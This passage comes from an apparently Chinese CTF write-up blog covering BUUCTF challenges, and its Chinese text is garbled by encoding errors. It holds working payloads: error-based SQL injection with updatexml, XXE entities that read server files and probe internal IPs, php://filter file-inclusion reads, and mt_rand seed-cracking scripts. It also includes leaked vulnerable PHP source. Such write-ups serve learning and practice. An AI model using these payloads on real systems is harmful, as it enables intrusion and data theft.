</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=display:flex><span><span style=color:#ae81ff>123</span><span style=color:#e6db74>&#34;||(updatexml(1,concat(0x3a,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))),1))#
</span></span></span><span style=display:flex><span><span style=color:#e6db74>}c581b48e4277-aefa-87c4-b0d5-3b
</span></span></span><span style=display:flex><span><span style=color:#e6db74>b3-5d0b-4c78-afea-7724e84b185c}
</span></span></span></code></pre></div><pre tabindex=0><code>flag{bbcb1bb3-5d0b-4c78-afea-7724e84b185c}
</code></pre><h2 id=gwctf-2019æ¯ç‡¥çš„æŠ½å¥–>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><p>çœ‹æºç è·³è½¬</p><pre tabindex=0><code>http://bfe12956-b1e7-4181-9ab0-bf5ca313b625.node5.buuoj.cn:81/check.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#a6e22e>jnGtxhtnDl</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#75715e>#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼
</span></span></span><span style=display:flex><span><span style=color:#a6e22e>header</span>(<span style=color:#e6db74>&#34;Content-Type: text/html;charset=utf-8&#34;</span>);
</span></span><span style=display:flex><span><span style=color:#a6e22e>session_start</span>();
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#a6e22e>isset</span>($_SESSION[<span style=color:#e6db74>&#39;seed&#39;</span>])){
</span></span><span style=display:flex><span>$_SESSION[<span style=color:#e6db74>&#39;seed&#39;</span>]<span style=color:#f92672>=</span><span style=color:#a6e22e>rand</span>(<span style=color:#ae81ff>0</span>,<span style=color:#ae81ff>999999999</span>);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mt_srand</span>($_SESSION[<span style=color:#e6db74>&#39;seed&#39;</span>]);
</span></span><span style=display:flex><span>$str_long1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>;
</span></span><span style=display:flex><span>$str<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>$len1<span style=color:#f92672>=</span><span style=color:#ae81ff>20</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ( $i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $len1; $i<span style=color:#f92672>++</span> ){
</span></span><span style=display:flex><span>    $str<span style=color:#f92672>.=</span><span style=color:#a6e22e>substr</span>($str_long1, <span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>strlen</span>($str_long1) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>);       
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>$str_show <span style=color:#f92672>=</span> <span style=color:#a6e22e>substr</span>($str, <span style=color:#ae81ff>0</span>, <span style=color:#ae81ff>10</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p id=&#39;p1&#39;&gt;&#34;</span><span style=color:#f92672>.</span>$str_show<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#a6e22e>isset</span>($_POST[<span style=color:#e6db74>&#39;num&#39;</span>])){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span>($_POST[<span style=color:#e6db74>&#39;num&#39;</span>]<span style=color:#f92672>===</span>$str){<span style=color:#a6e22e>x</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}&lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#34;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#a6e22e>show_source</span>(<span style=color:#e6db74>&#34;check.php&#34;</span>);
</span></span></code></pre></div><p>å·²çŸ¥å¼€å¤´å…¶å®æ˜¯ä¼ªéšæœºå§ï¼Œå°è¯•çˆ†ç ´seed</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#f92672>import</span> random
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> string
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> threading
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å·²çŸ¥çš„å‰10ä¸ªå­—ç¬¦</span>
</span></span><span style=display:flex><span>known_prefix <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;jnGtxhtnDl&#34;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å­—ç¬¦é›†</span>
</span></span><span style=display:flex><span>str_long1 <span style=color:#f92672>=</span> string<span style=color:#f92672>.</span>ascii_lowercase <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>digits <span style=color:#f92672>+</span> string<span style=color:#f92672>.</span>ascii_uppercase
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å®šä¹‰ä¸€ä¸ªçº¿ç¨‹å‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç§å­èŒƒå›´</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>check_seed_range</span>(seed_start, seed_end):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> seed <span style=color:#f92672>in</span> range(seed_start, seed_end):
</span></span><span style=display:flex><span>        <span style=color:#75715e># ä½¿ç”¨å½“å‰ç§å­åˆå§‹åŒ–éšæœºæ•°ç”Ÿæˆå™¨</span>
</span></span><span style=display:flex><span>        random<span style=color:#f92672>.</span>seed(seed)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># ç”Ÿæˆ20ä¸ªå­—ç¬¦</span>
</span></span><span style=display:flex><span>        str_generated <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span><span style=color:#f92672>.</span>join(random<span style=color:#f92672>.</span>choice(str_long1) <span style=color:#66d9ef>for</span> _ <span style=color:#f92672>in</span> range(<span style=color:#ae81ff>20</span>))
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># è·å–å‰10ä¸ªå­—ç¬¦</span>
</span></span><span style=display:flex><span>        str_show <span style=color:#f92672>=</span> str_generated[:<span style=color:#ae81ff>10</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># å¦‚æœå‰10ä¸ªå­—ç¬¦åŒ¹é…ï¼Œè¾“å‡ºç»“æœ</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> str_show <span style=color:#f92672>==</span> known_prefix:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;æ‰¾åˆ°åŒ¹é…çš„ç§å­: </span><span style=color:#e6db74>{</span>seed<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;å®Œæ•´çš„20å­—ç¬¦å­—ç¬¦ä¸²: </span><span style=color:#e6db74>{</span>str_generated<span style=color:#e6db74>}</span><span style=color:#e6db74>&#34;</span>)
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>True</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e># æ¯å¤„ç†1ä¸‡ä¸ªç§å­è¾“å‡ºä¸€æ¬¡è¿›åº¦</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> seed <span style=color:#f92672>%</span> <span style=color:#ae81ff>10000</span> <span style=color:#f92672>==</span> <span style=color:#ae81ff>0</span>:
</span></span><span style=display:flex><span>            print(<span style=color:#e6db74>f</span><span style=color:#e6db74>&#34;å·²æ£€æŸ¥ </span><span style=color:#e6db74>{</span>seed<span style=color:#e6db74>}</span><span style=color:#e6db74> ä¸ªç§å­...&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>False</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># å¤šçº¿ç¨‹å‡½æ•°ï¼Œåˆ†é…ä»»åŠ¡åˆ°ä¸åŒçº¿ç¨‹</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>find_seed_in_threads</span>(start, end, num_threads):
</span></span><span style=display:flex><span>    <span style=color:#75715e># æ¯ä¸ªçº¿ç¨‹è´Ÿè´£ä¸€ä¸ªç§å­èŒƒå›´</span>
</span></span><span style=display:flex><span>    thread_range <span style=color:#f92672>=</span> (end <span style=color:#f92672>-</span> start) <span style=color:#f92672>//</span> num_threads
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    threads <span style=color:#f92672>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(num_threads):
</span></span><span style=display:flex><span>        seed_start <span style=color:#f92672>=</span> start <span style=color:#f92672>+</span> i <span style=color:#f92672>*</span> thread_range
</span></span><span style=display:flex><span>        seed_end <span style=color:#f92672>=</span> start <span style=color:#f92672>+</span> (i <span style=color:#f92672>+</span> <span style=color:#ae81ff>1</span>) <span style=color:#f92672>*</span> thread_range <span style=color:#66d9ef>if</span> i <span style=color:#f92672>!=</span> num_threads <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span> <span style=color:#66d9ef>else</span> end
</span></span><span style=display:flex><span>        thread <span style=color:#f92672>=</span> threading<span style=color:#f92672>.</span>Thread(target<span style=color:#f92672>=</span>check_seed_range, args<span style=color:#f92672>=</span>(seed_start, seed_end))
</span></span><span style=display:flex><span>        threads<span style=color:#f92672>.</span>append(thread)
</span></span><span style=display:flex><span>        thread<span style=color:#f92672>.</span>start()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e># ç­‰å¾…æ‰€æœ‰çº¿ç¨‹å®Œæˆ</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> thread <span style=color:#f92672>in</span> threads:
</span></span><span style=display:flex><span>        thread<span style=color:#f92672>.</span>join()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># è®¾ç½®ç§å­èŒƒå›´å¹¶å¯åŠ¨å¤šçº¿ç¨‹æœç´¢</span>
</span></span><span style=display:flex><span>seed_start <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>
</span></span><span style=display:flex><span>seed_end <span style=color:#f92672>=</span> <span style=color:#ae81ff>999999999</span>  
</span></span><span style=display:flex><span>num_threads <span style=color:#f92672>=</span> <span style=color:#ae81ff>8</span>  <span style=color:#75715e># ä½¿ç”¨8ä¸ªçº¿ç¨‹</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>find_seed_in_threads(seed_start, seed_end, num_threads)
</span></span></code></pre></div><p>çˆ†ä¸å‡ºæ¥ï¼Œçœ‹ä¸€ä¸‹wpå§ï¼Œè€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹æ˜¯php_mt_seedå·¥å…·çš„ä½¿ç”¨</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span>
</span></span><span style=display:flex><span>str1<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span> <span style=color:#75715e>#åŠ å¯†ç”¨ä¸²</span>
</span></span><span style=display:flex><span>str2<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;jnGtxhtnDl&#39;</span>      <span style=color:#75715e>#å·²çŸ¥ä¸²</span>
</span></span><span style=display:flex><span>length <span style=color:#f92672>=</span> len(str2)
</span></span><span style=display:flex><span>res<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> i <span style=color:#f92672>in</span> range(len(str2)):
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>for</span> j <span style=color:#f92672>in</span> range(len(str1)):
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> str2[i] <span style=color:#f92672>==</span> str1[j]:
</span></span><span style=display:flex><span>            res<span style=color:#f92672>+=</span>str(j)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>+</span>str(j)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39;0&#39;</span><span style=color:#f92672>+</span><span style=color:#e6db74>&#39; &#39;</span><span style=color:#f92672>+</span>str(len(str1)<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>)<span style=color:#f92672>+</span><span style=color:#e6db74>&#39; &#39;</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>break</span>
</span></span><span style=display:flex><span>print(res)
</span></span><span style=display:flex><span><span style=color:#75715e>#9 9 0 61 13 13 0 61 42 42 0 61 19 19 0 61 23 23 0 61 7 7 0 61 19 19 0 61 13 13 0 61 39 39 0 61 11 11 0 61 </span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>mt_srand</span>(<span style=color:#a6e22e>seed</span>);  <span style=color:#75715e>//æ‰€å¾—ä¸²
</span></span></span><span style=display:flex><span>$str_long1 <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span>;
</span></span><span style=display:flex><span>$str<span style=color:#f92672>=</span><span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>$len1<span style=color:#f92672>=</span><span style=color:#ae81ff>20</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>for</span> ( $i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; $i <span style=color:#f92672>&lt;</span> $len1; $i<span style=color:#f92672>++</span> ){
</span></span><span style=display:flex><span>    $str<span style=color:#f92672>.=</span><span style=color:#a6e22e>substr</span>($str_long1, <span style=color:#a6e22e>mt_rand</span>(<span style=color:#ae81ff>0</span>, <span style=color:#a6e22e>strlen</span>($str_long1) <span style=color:#f92672>-</span> <span style=color:#ae81ff>1</span>), <span style=color:#ae81ff>1</span>);       
</span></span><span style=display:flex><span>} 
</span></span><span style=display:flex><span><span style=color:#66d9ef>print</span>($str);
</span></span></code></pre></div><p>è¿™ç§çƒ‚é¢˜ä»¥å‰æ˜¯æ€ä¹ˆå‡ºå‡ºæ¥çš„ï¼Ÿçº¯è´¹æ—¶é—´ï¼Œåšæ³•æ˜¯è¿™æ ·çš„ï¼Œæ²¡è·‘å‡ºç­”æ¡ˆ</p><h2 id=nctf2019true-xml-cookbook>[NCTF2019]True XML cookbook</h2><p>xxeæ³¨å…¥</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE a [
</span></span></span><span style=display:flex><span><span style=color:#75715e> &lt;!ENTITY abc SYSTEM &#34;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&#34;&gt;</span>
</span></span><span style=display:flex><span> ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;user&gt;&lt;username&gt;</span>&amp;abc;<span style=color:#f92672>&lt;/username&gt;&lt;password&gt;</span>123456<span style=color:#f92672>&lt;/password&gt;&lt;/user&gt;</span>
</span></span></code></pre></div><p>çœ‹ä¸€ä¸‹å†…å®¹</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-xml data-lang=xml><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;!DOCTYPE a [
</span></span></span><span style=display:flex><span><span style=color:#75715e> &lt;!ENTITY abc SYSTEM &#34;/proc/net/fib_trie&#34;&gt;</span>
</span></span><span style=display:flex><span> ]&gt;
</span></span><span style=display:flex><span><span style=color:#f92672>&lt;user&gt;&lt;username&gt;</span>&amp;abc;<span style=color:#f92672>&lt;/username&gt;&lt;password&gt;</span>123456<span style=color:#f92672>&lt;/password&gt;&lt;/user&gt;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>POST /doLogin.php HTTP/1.1
</span></span><span style=display:flex><span>Host: 9e8fb26d-691a-4e3f-b1da-ed44b5f9e1c0.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Accept: application/xml, text/xml, */*; q<span style=color:#f92672>=</span>0.01
</span></span><span style=display:flex><span>Origin: http://9e8fb26d-691a-4e3f-b1da-ed44b5f9e1c0.node5.buuoj.cn:81
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q<span style=color:#f92672>=</span>0.9,en;q<span style=color:#f92672>=</span>0.8,en-GB;q<span style=color:#f92672>=</span>0.7,en-US;q<span style=color:#f92672>=</span>0.6
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>X-Requested-With: XMLHttpRequest
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 <span style=color:#f92672>(</span>Windows NT 10.0; Win64; x64<span style=color:#f92672>)</span> AppleWebKit/537.36 <span style=color:#f92672>(</span>KHTML, like Gecko<span style=color:#f92672>)</span> Chrome/133.0.0.0 Safari/537.36 Edg/133.0.0.0
</span></span><span style=display:flex><span>Content-Type: application/xml;charset<span style=color:#f92672>=</span>UTF-8
</span></span><span style=display:flex><span>Referer: http://9e8fb26d-691a-4e3f-b1da-ed44b5f9e1c0.node5.buuoj.cn:81/
</span></span><span style=display:flex><span>Content-Length: <span style=color:#ae81ff>61</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>&lt;?xml version<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;1.0&#34;</span> encoding<span style=color:#f92672>=</span><span style=color:#e6db74>&#34;UTF-8&#34;</span>?&gt;
</span></span><span style=display:flex><span>&lt;!DOCTYPE a <span style=color:#f92672>[</span>
</span></span><span style=display:flex><span> &lt;!ENTITY abc SYSTEM <span style=color:#e6db74>&#34;http://10.244.244{{int(1-255)}}.&#34;</span>&gt;
</span></span><span style=display:flex><span> <span style=color:#f92672>]</span>&gt;
</span></span><span style=display:flex><span>&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></div><p>buuç¯å¢ƒçš„é—®é¢˜ï¼Œæ¯”è¾ƒéº»çƒ¦</p><h2 id=ciscn2019-ååŒ—èµ›åŒº-day1-web5cyberpunk>[CISCN2019 ååŒ—èµ›åŒº Day1 Web5]CyberPunk</h2><p>å¯ä»¥è¿›è¡Œæ–‡ä»¶çš„è¯»å–</p><pre tabindex=0><code>/index.php?file=php://filter/convert.base64-encode/resource=index.php
</code></pre><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#a6e22e>ini_set</span>(<span style=color:#e6db74>&#39;open_basedir&#39;</span>, <span style=color:#e6db74>&#39;/var/www/html/&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// $file = $_GET[&#34;file&#34;];
</span></span></span><span style=display:flex><span>$file <span style=color:#f92672>=</span> (<span style=color:#a6e22e>isset</span>($_GET[<span style=color:#e6db74>&#39;file&#39;</span>]) <span style=color:#f92672>?</span> $_GET[<span style=color:#e6db74>&#39;file&#39;</span>] <span style=color:#f92672>:</span> <span style=color:#66d9ef>null</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($file)){
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>(<span style=color:#e6db74>&#34;/phar|zip|bzip2|zlib|data|input|%00/i&#34;</span>,$file)) {
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>echo</span>(<span style=color:#e6db74>&#39;no way!&#39;</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#f92672>@</span><span style=color:#66d9ef>include</span>($file);
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span><span style=color:#75715e>?&gt;</span><span style=color:#960050;background-color:#1e0010>
</span></span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>#search.php
</span></span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#e6db74>&#34;config.php&#34;</span>; 
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#34;user_name&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#34;phone&#34;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    $pattern <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span>;
</span></span><span style=display:flex><span>    $user_name <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#34;user_name&#34;</span>];
</span></span><span style=display:flex><span>    $phone <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#34;phone&#34;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>($pattern,$user_name) <span style=color:#f92672>||</span> <span style=color:#a6e22e>preg_match</span>($pattern,$phone)){ 
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;no sql inject!&#39;</span>;
</span></span><span style=display:flex><span>    }<span style=color:#66d9ef>else</span>{
</span></span><span style=display:flex><span>        $sql <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;select * from `user` where `user_name`=&#39;</span><span style=color:#e6db74>{</span>$user_name<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39; and `phone`=&#39;</span><span style=color:#e6db74>{</span>$phone<span style=color:#e6db74>}</span><span style=color:#e6db74>&#39;&#34;</span>;
</span></span><span style=display:flex><span>        $fetch <span style=color:#f92672>=</span> $db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>query</span>($sql);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>isset</span>($fetch) <span style=color:#f92672>&amp;&amp;</span> $fetch<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>num_rows</span><span style=color:#f92672>&gt;</span><span style=color:#ae81ff>0</span>){
</span></span><span style=display:flex><span>        $row <span style=color:#f92672>=</span> $fetch<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>fetch_assoc</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span>$row) {
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>echo</span> <span style=color:#e6db74>&#39;error&#39;</span>;
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>print_r</span>($db<span style=color:#f92672>-&gt;</span><span style=color:#a6e22e>error</span>);
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>exit</span>;
</span></span><span style=display:flex><span>        }
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;&lt;p&gt;å§“å:&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#39;user_name&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/p&gt;&lt;p&gt;, ç”µè¯:&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#39;phone&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/p&gt;&lt;p&gt;, åœ°å€:&#34;</span><span style=color:#f92672>.</span>$row[<span style=color:#e6db74>&#39;address&#39;</span>]<span style=color:#f92672>.</span><span style=color:#e6db74>&#34;&lt;/p&gt;&#34;</span>;
</span></span><span style=display:flex><span>    } <span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>        $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;æœªæ‰¾åˆ°è®¢å•!&#34;</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>}<span style=color:#66d9ef>else</span> {
</span></span><span style=display:flex><span>    $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#34;ä¿¡æ¯ä¸å…¨&#34;</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-php data-lang=php><span style=display:flex><span><span style=color:#75715e>#change.php
</span></span></span><span style=display:flex><span><span style=color:#f92672>&lt;?</span><span style=color:#a6e22e>php</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>require_once</span> <span style=color:#e6db74>&#34;config.php&#34;</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>if</span>(<span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#34;user_name&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#34;address&#34;</span>]) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#f92672>!</span><span style=color:#66d9ef>empty</span>($_POST[<span style=color:#e6db74>&#34;phone&#34;</span>]))
</span></span><span style=display:flex><span>{
</span></span><span style=display:flex><span>    $msg <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;&#39;</span>;
</span></span><span style=display:flex><span>    $pattern <span style=color:#f92672>=</span> <span style=color:#e6db74>&#39;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#39;</span>;
</span></span><span style=display:flex><span>    $user_name <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#34;user_name&#34;</span>];
</span></span><span style=display:flex><span>    $address <span style=color:#f92672>=</span> <span style=color:#a6e22e>addslashes</span>($_POST[<span style=color:#e6db74>&#34;address&#34;</span>]);
</span></span><span style=display:flex><span>    $phone <span style=color:#f92672>=</span> $_POST[<span style=color:#e6db74>&#34;phone&#34;</span>];
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>preg_match</span>($pattern,$user_name) <span style=color:#f92672>||</span> <span style=color:#a6e22e>preg_match</span>($pattern,$phone)){
